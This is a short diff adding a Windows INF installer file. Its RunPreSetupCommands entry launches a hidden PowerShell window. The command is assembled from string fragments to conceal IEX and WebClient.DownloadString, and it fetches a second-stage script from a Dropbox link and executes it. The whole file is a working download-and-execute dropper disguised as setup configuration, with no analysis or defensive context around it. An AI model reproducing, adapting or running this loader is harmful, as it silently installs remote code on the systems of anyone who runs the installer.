@@ -1,0 +1,9 @@
+[version]
+Signature=$CHICAGO$
+AdvancedINF=2.5
+
+[DefaultInstall]
+RunPreSetupCommands=A.B
+
+[A.B]
+powershell.exe -WindowStyle Hidden -Command "$a='I'+'E'+'X';$b='New'+'-'+'Object'+' Net.WebClient';$c='.Down'+'load'+'String(''https://www.dropbox.com/scl/fi/gimllxwchmr3ujdsqo7gp/stage2.ps1?rlkey=jyo90g96zv877kth3ri1dc1mx&st=v6flx16b&dl=1'')';&$a (&$b $c)"
